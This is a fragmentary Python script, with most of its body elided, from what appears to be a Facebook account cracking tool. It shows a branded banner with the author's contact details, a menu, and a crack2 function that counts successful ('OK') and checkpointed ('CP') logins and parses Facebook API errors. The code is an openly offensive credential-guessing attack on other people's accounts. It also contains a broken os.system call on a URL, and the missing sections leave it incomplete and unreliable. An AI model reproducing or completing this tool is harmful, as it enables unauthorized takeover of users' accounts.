...
def banner():
    ...
    _____ _   _ _____ _____ _____  _    _  ____  
  / ____| \ | |_   _/ ____|  __ \| |  | |/ __ \ 
 | (___ |  \| | | || |  __| |  | | |__| | |  | |
  \___ \| . ` | | || | |_ | |  | |  __  | |  | |
  ____) | |\  |_| || |__| | |__| | |  | | |__| |
...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mTeddy Vai
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801799950929
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mTeddy
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://youtube.com/channel/UCI2A0fpKv3-Dqg4BIGTmhUw")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [TEDDY] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [TEDDY-CP] %s|%s        '%(b,idf,pw))
